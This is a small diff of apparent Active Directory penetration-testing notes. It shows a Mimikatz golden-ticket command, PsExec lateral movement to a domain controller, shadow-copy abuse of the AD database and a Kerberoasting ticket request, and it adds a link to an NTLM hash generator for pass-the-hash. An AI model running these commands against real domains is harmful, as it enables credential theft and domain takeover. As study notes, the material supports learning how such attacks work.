@@ -112,6 +112,7 @@
 3. Gen golden ticket ``` kerberos::golden /user:jen /domain:corp.com /sid:{domain} /krbtgt:{krbtgt ntlm hash} /ptt ```
 4. Run psexec to lateral movement ``` ./PsExec.exe \\dc1 cmd.exe ```
 
+
 ## Shadow Copies
 - Abusing Microsoft backup tech: Volume Shadow Service (Which backup AD database)
 - Req Admin in Domain controller
@@ -137,3 +138,8 @@
     New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '{SPN}'
     ```
 3. Kerberoast 
+
+# NTLM 
+## Generator
+- If u already have the password but u need to pash NTLM hash ->
+- https://codebeautify.org/ntlm-hash-generator
